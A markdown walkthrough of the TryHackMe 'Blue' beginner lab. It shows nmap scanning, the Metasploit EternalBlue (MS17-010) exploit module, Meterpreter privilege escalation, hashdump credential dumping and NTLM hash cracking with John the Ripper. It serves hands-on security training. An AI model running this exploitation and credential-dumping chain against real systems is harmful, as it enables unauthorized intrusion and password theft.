# 🔷 TryHackMe - Blue (Beginner Metasploit Room)

This markdown summarizes the TryHackMe room **Blue**, designed to help beginners practice basic recon, exploitation, privilege escalation, and post-exploitation using Metasploit.

---

## 🧭 Task 1 - Recon

### 🖼️ EternalBlue Poster (TryHackMe Style)

> This stylized artwork was created by the TryHackMe community to highlight the EternalBlue vulnerability used in this room.


### Objective:
Scan and identify the exploit the target machine is vulnerable to.

> ⚠️ Note:  
> The target machine does **not** respond to ICMP (ping). Give it a few minutes to boot up after starting.

### 📌 Instructions:
- Start the AttackBox (top of the page)
- Start the Machine (Split-screen view recommended)
- Perform an initial scan to determine services and versions

**Nmap Basic Scan Example:**
```bash
nmap -sV -p- <target-ip>
```

Once a Windows OS and port 445 are identified, you may consider checking for:
- **SMB vulnerabilities** like **MS17-010 (EternalBlue)**

---

## 💥 Task 2 - Gain Access

### Objective:
Use Metasploit to exploit the vulnerable service and gain a Meterpreter session.

### 📌 Exploit Example:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <your-ip>
run
```

After exploitation, you should receive a Meterpreter shell:
```bash
sessions
sessions -i 1
```

---

## 🔼 Task 3 - Escalate

### Objective:
Escalate your privileges on the system and upgrade the shell if needed.

### 📌 Useful Meterpreter Commands:
```bash
getuid
getpid
sysinfo
```

If in a limited shell:
```bash
load priv
getsystem
```

Or migrate to another process:
```bash
ps
migrate <PID>
```

---

## 🔓 Task 4 - Cracking

### Objective:
Dump password hashes and crack a **non-default user’s password**.

### 📌 Example:
```bash
hashdump
```

Copy the NTLM hash and use **John the Ripper** or **hashcat**:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## 🏁 Task 5 - Find Flags!

### Objective:
Find 3 “flags” that represent important parts of a Windows machine.

> These are not standard CTF-style flags — they're key files in Windows used for system identification or config purposes.

### 📌 Common Places to Look:
1. **Desktop** of compromised users
2. **System directory**
3. **Registry or environment variables**

Use:
```bash
search -f *.txt
```
